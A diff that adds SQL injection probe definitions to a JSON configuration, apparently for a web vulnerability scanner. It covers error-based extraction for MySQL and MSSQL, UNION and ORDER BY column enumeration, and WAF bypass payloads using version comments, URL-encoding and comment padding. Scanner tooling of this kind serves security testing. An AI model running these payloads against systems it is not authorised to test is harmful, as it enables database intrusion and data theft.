@@ -269,6 +269,133 @@
           "variables": {}
         }
       ]
+    },
+    "error_based": {
+      "description": "Error-based SQL injection for explicit data extraction via database error messages",
+      "tech_match": ["MySQL", "MSSQL", "Apache", "PHP", "IIS", "ASP.NET"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+          "description": "MySQL EXTRACTVALUE error-based extraction — XPATH syntax error leaks version() output",
+          "matchers": [
+            {"type": "word", "words": ["XPATH syntax", "xpath syntax"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
+          "description": "MySQL UPDATEXML error-based extraction — XPATH syntax error leaks current DB user",
+          "matchers": [
+            {"type": "word", "words": ["XPATH syntax", "xpath syntax"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
+          "description": "MSSQL CONVERT type mismatch error reveals current database name",
+          "matchers": [
+            {"type": "word", "words": ["conversion failed", "Conversion failed"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "union_detect": {
+      "description": "UNION-based column count enumeration — determines number of columns by incrementing NULLs until query succeeds",
+      "tech_match": [],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT NULL-- -",
+          "description": "Single-column UNION probe — status 200 or length diff indicates correct column count",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT NULL,NULL-- -",
+          "description": "Two-column UNION probe — status 200 or length diff indicates correct column count",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL-- -",
+          "description": "Three-column UNION probe — status 200 or length diff indicates correct column count",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} ORDER BY 10-- -",
+          "description": "ORDER BY out-of-range column — 500 error confirms fewer than 10 columns, revealing max column count",
+          "matchers": [
+            {"type": "status", "status": [500]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 25,
+          "variables": {}
+        }
+      ]
+    },
+    "waf_bypass": {
+      "description": "WAF bypass SQL injection payloads — MySQL version comments, URL-encoded keywords from HackTricks",
+      "tech_match": ["MySQL", "Apache", "PHP"],
+      "param_match": ["id", "uid", "pid", "num", "page", "idx", "index", "cat", "item_id", "user_id", "order_id"],
+      "probes": [
+        {
+          "payload": "{{baseline}}/*!50000UNION*//*!50000SELECT*/NULL-- -",
+          "description": "MySQL conditional version comment bypass — inline comments hide UNION/SELECT from WAF keyword matching",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' %55NION %53ELECT NULL-- -",
+          "description": "URL-encoded UNION SELECT (%55=U, %53=S) bypasses static keyword filters checking for literal strings",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'/**/UNION/**/SELECT/**/NULL-- -",
+          "description": "Comment-padded UNION SELECT — C-style comments break keyword detection in many WAF implementations",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
     }
   }
 }
